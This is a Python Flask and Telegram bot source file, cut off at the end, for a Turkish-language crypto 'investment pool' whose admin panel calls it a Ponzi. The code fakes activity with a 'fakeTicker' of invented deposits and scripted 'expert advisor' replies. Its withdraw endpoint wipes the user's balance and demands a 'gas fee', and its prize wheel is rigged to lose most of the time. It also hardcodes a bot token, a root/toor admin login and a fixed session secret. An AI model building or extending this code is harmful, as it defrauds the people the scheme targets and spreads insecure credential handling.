import os
import logging
import random
import string
import sqlite3
import datetime
import requests
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Logging ayarları
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")

app = Flask(__name__)
app.secret_key = "gizli_admin_session_anahtari_kanka"

# --- VERİTABANI BAŞLANGIÇ ---
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0,
            invested REAL DEFAULT 0.0,
            locked_balance REAL DEFAULT 0.0,
            has_gold_key INTEGER DEFAULT 0,
            ref_token TEXT,
            referrer_id INTEGER DEFAULT 0,
            last_bonus TEXT DEFAULT '2000-01-01 00:00:00'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            owner_id INTEGER,
            uses INTEGER DEFAULT 0,
            max_uses INTEGER DEFAULT 10,
            active INTEGER DEFAULT 1
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdraws (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            iban TEXT,
            status TEXT DEFAULT 'Beklemede (Gas Fee Gerekli)'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            tx_info TEXT,
            status TEXT DEFAULT 'Onay Bekliyor'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect('bot_database.db')
    conn.row_factory = sqlite3.Row
    return conn

# --- HTML ŞABLONLARI (Çoklu Dil & Canlı Destek Entegreli) ---

MINI_APP_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Yatırım Havuzu</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #fff; padding: 15px; text-align: center; margin: 0; }
        .card { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        input { width: 85%; padding: 10px; border-radius: 8px; border: none; margin-top: 8px; font-size: 14px; text-align: center; background: #334155; color: white; outline: none; }
        button { background: #3b82f6; color: white; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-size: 14px; margin-top: 10px; font-weight: bold; width: 90%; }
        button:hover { background: #2563eb; }
        .success { color: #22c55e; margin-top: 8px; font-weight: bold; font-size: 14px; }
        .error { color: #ef4444; margin-top: 8px; font-weight: bold; font-size: 14px; }
        .warning { color: #f59e0b; font-size: 12px; margin-top: 8px; line-height: 1.3; }
        .tab-btn { background: #475569; margin: 2px; padding: 5px 4px; width: 15%; display: inline-block; font-size: 10px; cursor: pointer; border-radius: 6px; border:none; color:white;}
        .section { display: none; }
        .active-section { display: block; }
        .ticker { background: #1e293b; color: #38bdf8; font-size: 11px; padding: 6px; border-radius: 6px; margin-bottom: 10px; font-weight: bold; white-space: nowrap; overflow: hidden; }
        .lang-bar { margin-bottom: 10px; text-align: right; }
        .lang-btn { background: #334155; border: none; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }
        table { width: 100%; font-size: 12px; margin-top: 5px; border-collapse: collapse; }
        th, td { padding: 6px; border-bottom: 1px solid #334155; text-align: left; }
        th { color: #38bdf8; }
    </style>
</head>
<body>
    <div class="lang-bar">
        <button class="lang-btn" onclick="setLang('tr')">🇹🇷 TR</button>
        <button class="lang-btn" onclick="setLang('en')">🇬🇧 EN</button>
        <button class="lang-btn" onclick="setLang('ru')">🇷🇺 RU</button>
        <button class="lang-btn" onclick="setLang('es')">🇪🇸 ES</button>
    </div>

    <h2 id="t_title">💎 Global Yatırım Havuzu</h2>
    
    <div class="ticker" id="tickerText">🔔 Ahmet Y. az önce 500 USDT yatırım yaptı!</div>

    <div>
        <button class="tab-btn" onclick="showTab('wallet')" id="t_tab1">Cüzdan</button>
        <button class="tab-btn" onclick="showTab('invest')" id="t_tab2">Paketler</button>
        <button class="tab-btn" onclick="showTab('wheel')" id="t_tab3">Çark</button>
        <button class="tab-btn" onclick="showTab('bonus')" id="t_tab4">Bonus</button>
        <button class="tab-btn" onclick="showTab('support')" id="t_tab5">Destek</button>
        <button class="tab-btn" onclick="showTab('leaderboard')" id="t_tab6">Lider</button>
    </div>

    <!-- CÜZDAN -->
    <div id="wallet" class="section active-section">
        <div class="card">
            <h3 id="t_wallet_title">Varlık Durumu</h3>
            <p><span id="t_nakit">Nakit Bakiye</span>: <span id="balance" style="font-size: 18px; font-weight: bold; color: #facc15;">0.00 TL</span></p>
            <p><span id="t_kilitli">Kilitli Anapara</span>: <span id="locked" style="font-size: 18px; font-weight: bold; color: #ef4444;">0.00 TL</span></p>
            <p><span id="t_aktif">Aktif Yatırım</span>: <span id="invested" style="font-size: 18px; font-weight: bold; color: #10b981;">0.00 TL</span></p>
            <p><span id="t_ref">Referans Linkiniz</span>: <br><input type="text" id="refLink" readonly style="font-size:11px; color:#38bdf8;"></p>
        </div>

        <div class="card">
            <h3 id="t_withdraw_title">Para Çekme Talebi</h3>
            <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan veya IBAN">
            <button onclick="requestWithdraw()" style="background: #10b981;" id="t_withdraw_btn">Çekim Yap</button>
            <p class="warning" id="t_withdraw_desc">⚠️ Çekim için blokzincir Gas Fee (150 TL) ödemesi gereklidir.</p>
            <p id="withdrawMsg"></p>
        </div>
    </div>

    <!-- PAKETLER -->
    <div id="invest" class="section">
        <div class="card" style="border: 2px solid #3b82f6;">
            <h3 id="t_pkg1_title">🚀 Bronz Paket (30 Gün Kilitli)</h3>
            <p style="font-size:12px; color:#94a3b8;" id="t_pkg1_desc">Yatırım: 500 TL (USDT) | Saatlik ROI</p>
            <button onclick="investPackage(500, true)" style="background: #3b82f6;" id="t_pkg1_btn">500 TL Yatır</button>
        </div>
        <div class="card" style="border: 2px solid #8b5cf6;">
            <h3 id="t_pkg2_title">👑 VIP Altın Paket (30 Gün Kilitli)</h3>
            <p style="font-size:12px; color:#94a3b8;" id="t_pkg2_desc">Yatırım: 2500 TL (USDT) | Yüksek Getiri</p>
            <button onclick="investPackage(2500, true)" style="background: #3b82f6;" id="t_pkg2_btn">2500 TL Yatır</button>
        </div>
        <p id="investMsg" class="warning"></p>
    </div>

    <!-- ÇARK -->
    <div id="wheel" class="section">
        <div class="card">
            <h3 id="t_wheel_title">🎡 Şans Çarkı</h3>
            <p style="font-size: 12px; color: #94a3b8;" id="t_wheel_desc">50 TL ver, 3x kazanma şansını dene!</p>
            <button onclick="spinWheel()" style="background: #ef4444;" id="t_wheel_btn">Çarkı Çevir (50 TL)</button>
            <p id="wheelMsg" style="margin-top: 10px; font-weight: bold;"></p>
        </div>
    </div>

    <!-- BONUS -->
    <div id="bonus" class="section">
        <div class="card">
            <h3 id="t_bonus_title">🎁 Günlük Dağıtım Bonusu</h3>
            <p style="font-size: 13px; color: #94a3b8;" id="t_bonus_desc">Günde 1 defa 10 TL ödülünü al!</p>
            <button onclick="claimBonus()" style="background: #8b5cf6;" id="t_bonus_btn">Ödülü Topla</button>
            <p id="bonusMsg"></p>
        </div>
    </div>

    <!-- CANLI DESTEK / DANIŞMAN -->
    <div id="support" class="section">
        <div class="card">
            <h3 id="t_support_title">💬 Yatırım Danışmanı Canlı Destek</h3>
            <p style="font-size: 12px; color: #94a3b8;" id="t_support_desc">Uzmanlarımıza soru sorun, anında yanıt alın.</p>
            <input type="text" id="supportInput" placeholder="Mesajınızı yazın...">
            <button onclick="sendSupport()" style="background: #3b82f6;" id="t_support_btn">Gönder</button>
            <p id="supportReply" style="margin-top: 12px; color: #38bdf8; font-size: 13px;"></p>
        </div>
    </div>

    <!-- LİDERLİK -->
    <div id="leaderboard" class="section">
        <div class="card">
            <h3 id="t_lead_title">🏆 Liderler Tablosu</h3>
            <table>
                <tr><th id="t_th1">Sıra</th><th id="t_th2">Kullanıcı ID</th><th id="t_th3">Davet</th></tr>
                <tbody id="leaderboardBody">
                    <tr><td colspan="3" style="text-align:center;">Yükleniyor...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id || 123456789;

        // ÇOKLU DİL SÖZLÜĞÜ (TR, EN, RU, ES)
        const dict = {
            tr: {
                title: "💎 Global Yatırım Havuzu", tab1: "Cüzdan", tab2: "Paketler", tab3: "Çark", tab4: "Bonus", tab5: "Destek", tab6: "Lider",
                w_title: "Varlık Durumu", nakit: "Nakit Bakiye", kilitli: "Kilitli Anapara", aktif: "Aktif Yatırım", ref: "Referans Linkiniz",
                withdraw_title: "Para Çekme Talebi", withdraw_btn: "Çekim Yap", withdraw_desc: "⚠️ Çekim için blokzincir Gas Fee (150 TL) ödemesi gereklidir.",
                pkg1_title: "🚀 Bronz Paket (30 Gün Kilitli)", pkg1_desc: "Yatırım: 500 TL (USDT) | Saatlik ROI", pkg1_btn: "500 TL Yatır",
                pkg2_title: "👑 VIP Altın Paket (30 Gün Kilitli)", pkg2_desc: "Yatırım: 2500 TL (USDT) | Yüksek Getiri", pkg2_btn: "2500 TL Yatır",
                wheel_title: "🎡 Şans Çarkı", wheel_desc: "50 TL ver, 3x kazanma şansını dene!", wheel_btn: "Çarkı Çevir (50 TL)",
                bonus_title: "🎁 Günlük Dağıtım Bonusu", bonus_desc: "Günde 1 defa 10 TL ödülünü al!", bonus_btn: "Ödülü Topla",
                support_title: "💬 Yatırım Danışmanı Canlı Destek", support_desc: "Uzmanlarımıza soru sorun, anında yanıt alın.", support_btn: "Gönder",
                lead_title: "🏆 Liderler Tablosu", th1: "Sıra", th2: "Kullanıcı ID", th3: "Davet"
            },
            en: {
                title: "💎 Global Investment Pool", tab1: "Wallet", tab2: "Packages", tab3: "Wheel", tab4: "Bonus", tab5: "Support", tab6: "Leaders",
                w_title: "Asset Status", nakit: "Cash Balance", kilitli: "Locked Principal", aktif: "Active Investment", ref: "Referral Link",
                withdraw_title: "Withdrawal Request", withdraw_btn: "Withdraw", withdraw_desc: "⚠️ Blockchain Gas Fee (150 TL) required for withdrawal.",
                pkg1_title: "🚀 Bronze Package (30 Days Locked)", pkg1_desc: "Investment: 500 TL (USDT) | Hourly ROI", pkg1_btn: "Invest 500 TL",
                pkg2_title: "👑 VIP Gold Package (30 Days Locked)", pkg2_desc: "Investment: 2500 TL (USDT) | High Yield", pkg2_btn: "Invest 2500 TL",
                wheel_title: "🎡 Lucky Wheel", wheel_desc: "Pay 50 TL, try to win 3x!", wheel_btn: "Spin Wheel (50 TL)",
                bonus_title: "🎁 Daily Distribution Bonus", bonus_desc: "Claim your 10 TL reward once a day!", bonus_btn: "Claim Reward",
                support_title: "💬 Investment Advisor Live Support", support_desc: "Ask our experts, get instant answers.", support_btn: "Send",
                lead_title: "🏆 Leaderboard", th1: "Rank", th2: "User ID", th3: "Invites"
            },
            ru: {
                title: "💎 Глобальный инвестиционный пулл", tab1: "Кошелек", tab2: "Пакеты", tab3: "Колесо", tab4: "Бонус", tab5: "Поддержка", tab6: "Лидеры",
                w_title: "Статус активов", nakit: "Наличный баланс", kilitli: "Заблокированный капитал", aktif: "Активные инвестиции", ref: "Реферальная ссылка",
                withdraw_title: "Запрос на вывод", withdraw_btn: "Вывести", withdraw_desc: "⚠️ Требуется комиссия Gas Fee (150 TL) для вывода.",
                pkg1_title: "🚀 Бронзовый пакет (Замок 30 дней)", pkg1_desc: "Инвестиции: 500 TL | Ежечасный ROI", pkg1_btn: "Инвестировать 500 TL",
                pkg2_title: "👑 VIP Золотой пакет (Замок 30 дней)", pkg2_desc: "Инвестиции: 2500 TL | Высокий доход", pkg2_btn: "Инвестировать 2500 TL",
                wheel_title: "🎡 Колесо удачи", wheel_desc: "Сыграйте за 50 TL, выиграйте 3x!", wheel_btn: "Вращать (50 TL)",
                bonus_title: "🎁 Ежедневный бонус", bonus_desc: "Получайте 10 TL раз в день!", bonus_btn: "Забрать бонус",
                support_title: "💬 Онлайн поддержка", support_desc: "Задайте вопрос нашим экспертам.", support_btn: "Отправить",
                lead_title: "🏆 Таблица лидеров", th1: "Ранг", th2: "ID", th3: "Приглашения"
            },
            es: {
                title: "💎 Fondo de Inversión Global", tab1: "Billetera", tab2: "Paquetes", tab3: "Ruleta", tab4: "Bono", tab5: "Soporte", tab6: "Líderes",
                w_title: "Estado de Activos", nakit: "Efectivo", kilitli: "Principal Bloqueado", aktif: "Inversión Activa", ref: "Enlace de Referido",
                withdraw_title: "Solicitud de Retiro", withdraw_btn: "Retirar", withdraw_desc: "⚠️ Se requiere tarifa de gas de cadena de bloques (150 TL).",
                pkg1_title: "🚀 Paquete Bronce (Bloqueado 30 días)", pkg1_desc: "Inversión: 500 TL | ROI por hora", pkg1_btn: "Invertir 500 TL",
                pkg2_title: "👑 Paquete VIP Oro (Bloqueado 30 días)", pkg2_desc: "Inversión: 2500 TL | Alto Rendimiento", pkg2_btn: "Invertir 2500 TL",
                wheel_title: "🎡 Rueda de la Fortuna", wheel_desc: "¡Paga 50 TL y prueba ganar 3x!", wheel_btn: "Girar (50 TL)",
                bonus_title: "🎁 Bono Diario", bonus_desc: "¡Reclama tu recompensa de 10 TL al día!", bonus_btn: "Reclamar",
                support_title: "💬 Soporte en Vivo", support_desc: "Pregunta a nuestros expertos.", support_btn: "Enviar",
                lead_title: "🏆 Tabla de Líderes", th1: "Rango", th2: "ID", th3: "Invitaciones"
            }
        };

        function setLang(lang) {
            const d = dict[lang];
            document.getElementById('t_title').innerText = d.title;
            document.getElementById('t_tab1').innerText = d.tab1;
            document.getElementById('t_tab2').innerText = d.tab2;
            document.getElementById('t_tab3').innerText = d.tab3;
            document.getElementById('t_tab4').innerText = d.tab4;
            document.getElementById('t_tab5').innerText = d.tab5;
            document.getElementById('t_tab6').innerText = d.tab6;
            document.getElementById('t_wallet_title').innerText = d.w_title;
            document.getElementById('t_nakit').innerText = d.nakit;
            document.getElementById('t_kilitli').innerText = d.kilitli;
            document.getElementById('t_aktif').innerText = d.aktif;
            document.getElementById('t_ref').innerText = d.ref;
            document.getElementById('t_withdraw_title').innerText = d.withdraw_title;
            document.getElementById('t_withdraw_btn').innerText = d.withdraw_btn;
            document.getElementById('t_withdraw_desc').innerText = d.withdraw_desc;
            document.getElementById('t_pkg1_title').innerText = d.pkg1_title;
            document.getElementById('t_pkg1_desc').innerText = d.pkg1_desc;
            document.getElementById('t_pkg1_btn').innerText = d.pkg1_btn;
            document.getElementById('t_pkg2_title').innerText = d.pkg2_title;
            document.getElementById('t_pkg2_desc').innerText = d.pkg2_desc;
            document.getElementById('t_pkg2_btn').innerText = d.pkg2_btn;
            document.getElementById('t_wheel_title').innerText = d.wheel_title;
            document.getElementById('t_wheel_desc').innerText = d.wheel_desc;
            document.getElementById('t_wheel_btn').innerText = d.wheel_btn;
            document.getElementById('t_bonus_title').innerText = d.bonus_title;
            document.getElementById('t_bonus_desc').innerText = d.bonus_desc;
            document.getElementById('t_bonus_btn').innerText = d.bonus_btn;
            document.getElementById('t_support_title').innerText = d.support_title;
            document.getElementById('t_support_desc').innerText = d.support_desc;
            document.getElementById('t_support_btn').innerText = d.support_btn;
            document.getElementById('t_lead_title').innerText = d.lead_title;
            document.getElementById('t_th1').innerText = d.th1;
            document.getElementById('t_th2').innerText = d.th2;
            document.getElementById('t_th3').innerText = d.th3;
        }

        const fakeTicker = [
            "🔔 Ahmet Y. az önce 250 USDT TRC20 yatırdı!",
            "🔥 Havuz Sigorta Fonu: 1.450.000 TL'ye ulaştı!",
            "💰 Mehmet K. gas fee ödemesini tamamladı!",
            "⭐ Zeynep T. 3. Seviye komisyon kazandı!"
        ];
        setInterval(() => {
            document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
        }, 4000);

        function showTab(tabName) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
            document.getElementById(tabName).classList.add('active-section');
            if(tabName === 'leaderboard') loadLeaderboard();
        }

        function loadData() {
            fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                document.getElementById('balance').innerText = data.balance.toFixed(2) + " TL";
                document.getElementById('invested').innerText = data.invested.toFixed(2) + " TL";
                document.getElementById('locked').innerText = data.locked.toFixed(2) + " TL";
                if(data.ref_token && data.ref_token !== "Yok") {
                    document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                } else {
                    document.getElementById('refLink').value = "Önce Yatırım Yapmalısın";
                }
            });
        }

        function investPackage(amount, insured) {
            fetch('/api/invest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, amount: amount, insured: insured })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('investMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function spinWheel() {
            fetch('/api/spin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('wheelMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function requestWithdraw() {
            const iban = document.getElementById('ibanInput').value.trim();
            const msg = document.getElementById('withdrawMsg');
            if(!iban) { msg.innerText = "Lütfen cüzdan girin!"; msg.className = "error"; return; }
            fetch('/api/withdraw', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, iban: iban })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
            });
        }

        function claimBonus() {
            fetch('/api/bonus', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('bonusMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function sendSupport() {
            const txt = document.getElementById('supportInput').value.trim();
            const reply = document.getElementById('supportReply');
            if(!txt) return;
            const replies = [
                "👨‍💻 Uzman Danışman: VIP 3 paketine geçerek çekim limitinizi anında kaldırabilirsiniz.",
                "👨‍💻 Uzman Danışman: Gas Fee ödemesini cüzdanınıza yatırarak tamamlayabilirsiniz.",
                "👨‍💻 Uzman Danışman: Sorunuz ekibimize iletildi, en kısa sürede işleme alınacaktır."
            ];
            reply.innerText = replies[Math.floor(Math.random() * replies.length)];
            document.getElementById('supportInput').value = "";
        }

        function loadLeaderboard() {
            fetch('/api/leaderboard').then(res => res.json()).then(data => {
                let html = '';
                data.forEach((item, index) => {
                    html += `<tr><td>#${index+1}</td><td>${item.user_id}</td><td>${item.count} Davet</td></tr>`;
                });
                document.getElementById('leaderboardBody').innerHTML = html || '<tr><td colspan="3" style="text-align:center;">Veri yok</td></tr>';
            });
        }

        loadData();
    </script>
</body>
</html>
"""

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Girişi</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: none; background: #334155; color: white; }
        button { width: 100%; padding: 12px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .error { color: #ef4444; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>🔒 Admin Girişi</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        {% if error %}<p class="error">{{ error }}</p>{% endif %}
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Paneli - Ponzi</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
        th { background: #0f172a; color: white; }
        h1, h2 { color: #0f172a; }
        .logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; }
        .btn { padding: 6px 12px; background: #10b981; color: white; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; }
        textarea { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #cbd5e1; margin-top: 5px; }
    </style>
</head>
<body>
    <a href="/admin-logout" class="logout">Çıkış Yap</a>
    <h1>🛠️ Ponzi Yönetim Merkezi & Duyuru Paneli</h1>
    
    <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
        <h2>📢 Tüm Kullanıcılara Duyuru Gönder (Broadcast)</h2>
        <form method="POST" action="/admin-broadcast">
            <textarea name="msg" rows="3" placeholder="Duyuru mesajını buraya yazın..." required></textarea>
            <button type="submit" class="btn" style="margin-top: 10px;">Duyuruyu Patlat</button>
        </form>
    </div>

    <h2>Kripto / USDT Ödeme Bildirimleri</h2>
    <table>
        <tr><th>ID</th><th>Kullanıcı ID</th><th>Bilgi</th><th>İşlem</th></tr>
        {% for p in payments %}
        <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_info }}</td><td><a href="/admin-approve-payment/{{ p.id }}" class="btn">Onayla</a></td></tr>
        {% else %}
        <tr><td colspan="4" style="text-align:center;">Bildirim yok.</td></tr>
        {% endfor %}
    </table>
</body>
</html>
"""

app = Flask(__name__)
app.secret_key = "gizli_admin_session_anahtari_kanka"

# --- FLASK ROTALARI & API'LER ---

@app.route('/')
def mini_app():
    return render_template_string(MINI_APP_HTML)

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        if request.form.get('username') == "root" and request.form.get('password') == "toor":
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
        error = "Hatalı şifre!"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/admin-panel')
def admin_panel():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    conn = get_db()
    users = conn.execute("SELECT * FROM users").fetchall()
    keys = conn.execute("SELECT * FROM keys").fetchall()
    withdraws = conn.execute("SELECT * FROM withdraws").fetchall()
    payments = conn.execute("SELECT * FROM payments WHERE status='Onay Bekliyor'").fetchall()
    conn.close()
    return render_template_string(ADMIN_HTML, users=users, keys=keys, withdraws=withdraws, payments=payments)

@app.route('/admin-broadcast', methods=['POST'])
def admin_broadcast():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    msg = request.form.get('msg')
    if msg:
        conn = get_db()
        users = conn.execute("SELECT user_id FROM users").fetchall()
        conn.close()
        # Telegram üzerinden kullanıcılara mesajı iletme kuyruğu
        for u in users:
            try:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
                    "chat_id": u["user_id"],
                    "text": f"📢 **YATIRIM HAVUZU DUYURUSU**:\n\n{msg}",
                    "parse_mode": "Markdown"
                })
            except:
                pass
    return redirect(url_for('admin_panel'))

@app.route('/admin-approve-payment/<int:pid>')
def approve_payment(pid):
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    conn = get_db()
    pay = conn.execute("SELECT * FROM payments WHERE id=?", (pid,)).fetchone()
    if pay:
        user_id = pay["user_id"]
        random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        conn.execute("UPDATE users SET has_gold_key=1, ref_token=? WHERE user_id=?", (random_key, user_id))
        conn.execute("INSERT INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
        conn.execute("UPDATE payments SET status='Onaylandı' WHERE id=?", (pid,))
        conn.commit()
    conn.close()
    return redirect(url_for('admin_panel'))

@app.route('/admin-logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not user:
        return jsonify({"balance": 0.0, "invested": 0.0, "locked": 0.0, "has_gold_key": False, "ref_token": "Yok"})
    return jsonify({"balance": user["balance"], "invested": user["invested"], "locked": user["locked_balance"], "has_gold_key": bool(user["has_gold_key"]), "ref_token": user["ref_token"] or "Yok"})

@app.route('/api/invest', methods=['POST'])
def invest():
    data = request.json
    user_id = int(data.get('user_id', 0))
    amount = float(data.get('amount', 0))
    insured = bool(data.get('insured', False))
    total_cost = amount * 1.10 if insured else amount
    
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < total_cost:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz bakiye!"})

    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (total_cost, amount, amount, user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": f"Tebrikler! {amount} TL yatırımınız kilitlendi ve sigortalandı."})

@app.route('/api/spin', methods=['POST'])
def spin():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < 50.0:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz bakiye (Min 50 TL)!"})

    conn.execute("UPDATE users SET balance = balance - 50 WHERE user_id=?", (user_id,))
    if random.choices(["lose", "win"], weights=[80, 20], k=1)[0] == "win":
        conn.execute("UPDATE users SET balance = balance + 150 WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({"success": True, "message": "🎉 Çarkıfeleği kazandın! 150 TL eklendi!"})
    else:
        conn.commit()
        conn.close()
        return jsonify({"success": False, "message": "😢 Maalesef kaybettin!"})

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = int(data.get('user_id', 0))
    iban = data.get('iban', '').strip()
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < 250.0:
        conn.close()
        return jsonify({"success": False, "message": "Minimum çekim 250 TL'dir!"})

    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede (Gas Fee Gerekli)')", (user_id, user["balance"], iban))
    conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": "⚠️ Çekim talebiniz alındı ancak Gas Fee (150 TL) ödenmediği için askıda!"})

@app.route('/api/bonus', methods=['POST'])
def bonus():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user:
        conn.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
        user = {"last_bonus": "2000-01-01 00:00:00"}
    
    last_bonus_str = user["last_bonus"] if "last_bonus" in user and user["last_bonus"] else "2000-01-01 00:00:00"
    last_bonus_time = datetime.datetime.strptime(last_bonus_str, '%Y-%m-%d %H:%M:%S')
    now = datetime.datetime.now()
    
    if now - last_bonus_time < datetime.timedelta(hours=24):
        remaining = datetime.timedelta(hours=24) - (now - last_bonus_time)
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes, _ = divmod(remainder, 60)
        conn.close()
        return jsonify({"success": False, "message": f"Bugünkü ödülünüzü aldınız. Kalan: {hours}s {minutes}dk"})

    conn.execute("UPDATE users SET balance = balance + 10, last_bonus = ? WHERE user_id=?", (now.strftime('%Y-%m-%d %H:%M:%S'), user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": "Günlük 10 TL havuz payı eklendi! 🎁"})

@app.route('/api/leaderboard')
def leaderboard():
    conn = get_db()
    res = conn.execute("SELECT owner_id as user_id, SUM(uses) as count FROM keys GROUP BY owner_id ORDER BY count DESC LIMIT 10").fetchall()
    conn.close()
    return jsonify([dict(row) for row in res])

# --- TELEGRAM BOT KOMUTLARI ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    conn = get_db()
    existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
    if not existing:
        referrer_id = 0
        if args:
            ref_code = args[0]
